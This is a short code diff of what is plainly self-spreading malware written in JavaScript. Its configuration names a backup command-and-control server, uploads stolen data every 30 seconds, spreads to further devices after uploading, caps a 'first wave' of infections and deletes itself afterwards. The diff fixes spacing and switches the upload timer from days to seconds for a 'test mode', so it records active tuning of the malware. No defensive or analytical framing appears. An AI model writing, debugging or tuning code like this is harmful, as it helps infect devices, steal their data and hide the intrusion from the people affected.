@@ -34,7 +34,7 @@ const CONFIG = {
     dataFolder: "data",
   },
   c2Server: "http://192.168.1.47:8080", // Backup C2
-  uploadIntervalSeconds:30,          // Send data once per 30s
+  uploadIntervalSeconds: 30,          // Send data once per 30s
   spreadAfterUpload: true,        // Spread after uploading
   selfDestructAfterSpread: true,  // Delete self after spreading
   maxDevicesInFirstWave: 5,       // Phase 1 limitation
@@ -581,7 +581,7 @@ class LifecycleManager {
   constructor(config) {
     this.config = config;
     this.infectionTime = Date.now();
-    this.uploadInterval = config.uploadIntervalDays * 86400000; // days to ms
+    this.uploadInterval = config.uploadIntervalSeconds * 1000; // seconds to ms (test mode)
     this.hasUploaded = false;
     this.hasSpread = false;
     this.hasSelfDestructed = false;
